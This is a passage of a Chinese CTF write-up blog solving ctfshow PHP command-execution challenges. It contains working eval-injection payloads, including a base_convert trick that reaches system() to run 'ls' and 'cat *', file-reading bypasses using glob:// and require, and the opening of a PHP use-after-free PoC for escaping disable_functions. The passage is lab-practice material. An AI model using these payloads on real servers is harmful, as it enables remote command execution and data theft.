11:25:09</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-10-06 14:04:45</span></span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    //ä¾‹å­ c=<span class="number">20</span><span class="literal">-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span></span><br><span class="line"><span class="string">    foreach (<span class="variable">$blacklist</span> as <span class="variable">$blackitem</span>) &#123;</span></span><br><span class="line"><span class="string">        if (preg_match(&#x27;/&#x27; . <span class="variable">$blackitem</span> . &#x27;/m&#x27;, <span class="variable">$content</span>)) &#123;</span></span><br><span class="line"><span class="string">            die(&quot;</span>è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line"><span class="string">    <span class="variable">$whitelist</span> = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span></span><br><span class="line"><span class="string">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span></span><br><span class="line"><span class="string">    foreach (<span class="variable">$used_funcs</span>[0] as <span class="variable">$func</span>) &#123;</span></span><br><span class="line"><span class="string">        if (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span></span><br><span class="line"><span class="string">            die(&quot;</span>è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    //å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line"><span class="string">    eval(&#x27;echo &#x27;.<span class="variable">$content</span>.&#x27;;&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>ä¸èƒ½æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œä¸èƒ½æœ‰é™¤whitelisté‡Œé¢çš„å­—æ¯ï¼Œå¤§æ¦‚æ€è·¯å°±æ˜¯åˆ©ç”¨è¿›åˆ¶è½¬æ¢ä»¥æ•°å­—æ„é€ å­—æ¯<br>é¢˜ä¸­å¯ç”¨çš„è¿›åˆ¶è½¬æ¢å‡½æ•°ï¼š<code>&#39;base_convert&#39;, &#39;bindec&#39;,&#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="type">abs</span>](<span class="variable">$_GET</span>[<span class="type">acos</span>])//strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>ï¼Œæœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥åˆ©ç”¨getå‘½ä»¤æ‰§è¡Œ</span><br><span class="line">â†“</span><br><span class="line"><span class="variable">$_GET</span>&#123;abs&#125;(<span class="variable">$_GET</span>&#123;acos&#125;)//[]åœ¨é»‘åå•ï¼Œç”¨&#123;&#125;ä»£æ›¿</span><br><span class="line">â†“</span><br><span class="line"><span class="variable">$pi</span>=_GET;<span class="variable">$</span><span class="variable">$pi</span>&#123;abs&#125;(<span class="variable">$</span><span class="variable">$pi</span>&#123;acos&#125;)</span><br><span class="line">â†“</span><br><span class="line">è¿›åˆ¶è½¬æ¢</span><br><span class="line">base_convert(number,frombase,tobase)ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</span><br><span class="line">dechex()ï¼šæŠŠåè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°</span><br><span class="line">hex2bin()ï¼šæŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œè¿”å› ASCII å­—ç¬¦</span><br><span class="line">æœ€é‡è¦çš„æ˜¯hex2binå‡½æ•°ï¼Œä½†æ˜¯ä¸åœ¨ç™½åå•é‡Œé¢</span><br><span class="line"></span><br><span class="line">base_convertæ„é€ hex2binï¼ˆæˆ‘æƒ³ç”¨base_convertç›´æ¥è½¬_GETï¼Œä½†æ˜¯åªèƒ½å¾—åˆ°getï¼‰</span><br><span class="line">base_convert(<span class="string">&#x27;hex2bin&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>)â†’<span class="number">37907361743</span></span><br><span class="line">_GETâ†’  hexåå…­è¿›åˆ¶ <span class="number">5</span>f474554 (ä¸èƒ½æœ‰å­—æ¯æ‰€ä»¥åå…­è¿›åˆ¶ä¸è¡Œ) â†’  decåè¿›åˆ¶ <span class="number">1598506324</span>(åœ¨çº¿è½¬æ¢)</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥_GETå¯ä»¥å†™ä¸º</span><br><span class="line">hex2bin(dechex(<span class="number">1598506324</span>))</span><br><span class="line">â†“</span><br><span class="line">base_convert(<span class="string">&#x27;37907361743&#x27;</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>))</span><br><span class="line"></span><br><span class="line">æœ€åçš„payload</span><br><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$</span><span class="variable">$pi</span>&#123;abs&#125;(<span class="variable">$</span><span class="variable">$pi</span>&#123;acos&#125;)&amp;abs=system&amp;acos=<span class="built_in">ls</span></span><br><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$</span><span class="variable">$pi</span>&#123;abs&#125;(<span class="variable">$</span><span class="variable">$pi</span>&#123;acos&#125;)&amp;abs=system&amp;acos=<span class="built_in">cat</span> *</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681316055871-f13664ad-be4d-43df-ba7c-d4fb99564492.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web58-77å‘½ä»¤æ‰§è¡Œç¯‡ï¼ˆä¸‰ï¼‰</title>
      <link href="/2023/04/13/web58-77%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2023/04/13/web58-77%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£å¸¸æ¥è¯´ï¼Œçœ‹åˆ°è¿™ä¸ªæ ¼å¼ï¼Œæˆ‘ä»¬ç¬¬ä¸€ä¸ªæƒ³åˆ°çš„å°±æ˜¯ä½¿ç”¨systemç„¶åå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å½“æˆ‘ä»¬å°è¯•ä½¿ç”¨æ—¶ä¼šå‘ç°ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188042126-c8349447-3fd5-476b-9f44-6882c1d58843.png" alt="image.png"><br>è¿™æ˜¯å› ä¸ºphp.inié…ç½®ä¸­é»˜è®¤ç¦ç”¨äº†æ‰§è¡Œç³»ç»Ÿå¤–éƒ¨å‘½ä»¤å‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨phpå†…ç½®å‡½æ•°æ¥è¯»å–æ–‡ä»¶ï¼Œå› æ­¤è¿™éƒ¨åˆ†å­¦ä¹ çš„æ—¶phpç›¸å…³å‡½æ•°çš„ä½¿ç”¨ã€‚<br>æˆ‘ä»¬éœ€è¦å…ˆæŸ¥çœ‹å½“å‰ç›®å½•ã€‚<code>c=print_r(glob(&quot;*&quot;));</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188390551-ccd0bc7e-f319-48f4-9048-e9709fe4a367.png" alt="image.png"><br>æˆ–è€…<code>c=print_r(scandir(&#39;.&#39;));</code>ï¼ˆæ³¨æ„ä¸¤è€…çš„è¿”å›æ•°ç»„å†…å®¹ä¸åŒï¼‰<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680188668314-11508ec5-a9c6-4805-a743-2b89641beb78.png" alt="image.png"><br>æˆ‘ä»¬ç›´æ¥æ˜¾ç¤ºä»£ç å°±è¡Œã€‚<br>postä¼ å‚ï¼Œ<code>c=highlight_file(&#39;flag.php&#39;);</code>æˆ–è€…<code>show_source(__FILE__);</code></p><h1 id="web59-65"><a href="#web59-65" class="headerlink" title="web59-65"></a>web59-65</h1><p>é¢˜å¯èƒ½å‡ºé”™äº†ï¼Œå’Œ58ä¸€æ¨¡ä¸€æ ·â€¦</p><h1 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show_sourceè¢«ç¦ç”¨ï¼Œhighlight_fileæŸ¥çœ‹flag.phpæ–‡ä»¶æç¤ºä¸åœ¨è¿™é‡Œã€‚<br>é‚£ä¹ˆæŸ¥çœ‹æ ¹ç›®å½•æ–‡ä»¶å‘ç°flag.txtã€‚<code>c=var_dump(scandir(&#39;/&#39;));</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680189387199-0ce00bd0-0d23-44e5-a511-2f3e9b96f24b.png" alt="image.png"><br>ç›´æ¥ç”¨highlight_fileè¯»æ–‡ä»¶ã€‚<code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><h1 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h1><p>ç¦ç”¨äº†print_r<br><code>var_dump(scandir(&#39;/&#39;));</code><br><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p><h1 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h1><p>æŠŠhighlight_fileç¦ç”¨äº†ã€‚ä½†æ˜¯å…¶ä»–çš„è¿˜å¯ä»¥ç”¨ã€‚<br><code>var_dump(scandir(&#39;/&#39;));</code>æŸ¥çœ‹æ ¹ç›®å½•æ–‡ä»¶ã€‚<br>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨includeã€requireå‡½æ•°æ¥é˜…è¯»æ–‡ä»¶ï¼š<code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h1><p>var_dumpè¢«ç¦ç”¨ï¼Œä½†æ˜¯googleäº†ä¸€ä¸‹ç±»ä¼¼å‡½æ•°ï¼Œå‘ç°äº†<code>var_export</code>å‡½æ•°åŠŸèƒ½ç±»ä¼¼ã€‚<br><code>c=var_export(scandir(&#39;/&#39;));</code><br>è¯»å–æ ¹ç›®å½•ä¸‹æ–‡ä»¶ã€‚<code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h1><p><code>c=var_export(scandir(&#39;/&#39;));</code><br><code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h1><p>å°è¯•è¯»å–æ ¹ç›®å½•ï¼š<code>c=var_export(scandir(&#39;/&#39;));</code>ä½†æ˜¯å‘ç°å‡ºç°å¦‚ä¸‹æƒ…å†µï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680191189835-ec426ee9-4d83-4d74-b321-79bbe39b0de7.png" alt="image.png"><br>ç»è¿‡æŸ¥è¯¢å‘ç°ï¼Œè¿™æ˜¯phpå¯¹ç¼“å†²åŒºè¿›è¡Œæ“ä½œå¯¼è‡´çš„ã€‚</p><blockquote><p><a href="https://blog.csdn.net/weixin_39938855/article/details/115944594">https://blog.csdn.net/weixin_39938855/article/details/115944594</a></p></blockquote><p>æŸ¥çœ‹index.phpåå‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åŸç†å°±æ˜¯ob_get_contents()å’Œob_end_clean();çš„æ‰§è¡Œï¼Œæˆ‘ä»¬æƒ³åŠæ³•è®©ä»–åé¢çš„éƒ¨åˆ†ä¸æ‰§è¡Œå³å¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯¹payloadåé¢åŠ ä¸Š<code>exit(0)</code>æˆªæ–­å³å¯ï¼ˆæˆ–è€…dieå‡½æ•°ï¼‰<br><code>c=var_export(scandir(&#39;/&#39;));die(1);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680191595296-540d251d-7abb-47f6-9f07-1ea8ef6685b7.png" alt="image.png"><br>è¿™æ ·æ–‡æœ¬å°±æ­£å¸¸äº†ã€‚<br><code>require(&#39;/flag.txt&#39;);</code></p><h1 id="web72"><a href="#web72" class="headerlink" title="*web72"></a>*web72</h1><p>scandirå‡½æ•°è¢«ç¦æ­¢äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®©æˆ‘ä»¬çœ‹çœ‹wpæ˜¯æ€ä¹ˆè§£çš„å§ã€‚ï¼ˆæ°´å¹³ä¸€ä¸‹åˆæ‹”èµ·æ¥äº†ã€‚ã€‚ã€‚ï¼‰<br>åˆ©ç”¨phpè„šæœ¬è¯»å–æ–‡ä»¶ç›®å½•ï¼šï¼ˆåˆ©ç”¨glob://ä¼ªåè®®ç»•è¿‡open_basedirï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>è¿™æ˜¯è®¿é—®æ ¹ç›®å½•ï¼Œå¦‚æœæƒ³è¦è®¿é—®ç½‘ç«™ç›®å½•ä¸ºï¼ˆç›¸å¯¹è·¯å¾„ï¼‰ï¼š</strong><code>**&quot;glob://./*&quot;**</code><br>å› ä¸ºscandirè¿™äº›ç®€å•å‡½æ•°è¢«ç¦ç”¨äº†ï¼Œå°±éœ€è¦æˆ‘ä»¬æ‰‹å†™å‡½æ•°æ¥è¾“å‡ºã€‚<br>å‘ç°ç›®å½•ä¸‹æœ‰flag0.txtï¼Œé‚£ä¹ˆç›´æ¥å°è¯•requireæ¥è¯»å–ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271902026-3d23f6a9-a78f-4a2f-a7c2-7e5ed8084dc7.png" alt="image.png"><br>ä½†æ˜¯å‘ç°è¿™äº›è¯»å–å‡½æ•°è¢«ç¦ç”¨äº†ï¼Œæ²¡æœ‰è¯»å–æƒé™ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1680271990810-7fa1a783-940b-48f6-8ef4-f07133f5c45e.png" alt="image.png"><br>uafç»•è¿‡open_basediræ‰§è¡Œå‘½ä»¤<br>pocï¼ˆéœ€è¦urlç¼–ç ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) 